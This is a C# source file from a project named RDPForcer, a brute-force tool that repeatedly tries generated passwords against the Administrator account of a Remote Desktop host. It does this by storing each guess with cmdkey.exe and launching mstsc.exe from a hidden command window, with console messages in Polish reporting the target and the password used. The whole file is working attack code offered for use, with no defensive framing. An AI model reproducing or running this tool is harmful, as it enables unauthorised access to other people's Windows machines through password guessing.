using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
namespace RDPForcer
{
    class RDPConnector
    {
        private int Port { set; get; }
        private string IpAddress { set; get; }
        private string accountName { set; get; }
        public RDPConnector(int port =3389, string ipaddress = "192.168.1.102", string accountName = "Administrator")
        {
            this.Port = port;
            this.IpAddress = ipaddress;
            this.accountName = accountName;
        }

        public void Attack()
        {
            
            var password = PasswordGen.Generate();
            
            var text = String.Format("Wątek # {0}\t Atakuję: {1} na porcie {2} \nAtakowane konto: {3}\nUżyte hasło:{4}", Thread.CurrentThread.ManagedThreadId, this.IpAddress, this.Port, this.accountName, password);
            Console.WriteLine(text);
            string command = "/c cmdkey.exe /generic:" + this.IpAddress
            + " /user:" + accountName + " /pass:" + password + " & mstsc.exe /v " + this.IpAddress;

            ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", command);
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.CreateNoWindow = true;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;

            Process process = new Process();
            process.StartInfo = processStartInfo;
            process.Start();
            var outputResultPromise = process.StandardOutput.ReadToEndAsync();
            outputResultPromise.ContinueWith(action =>
           {
               Console.WriteLine(action.Result);
           });
            Console.WriteLine("Poczekam chwilę na nawiązanie połączenia");
            Thread.Sleep(5000);
        }


    }
}
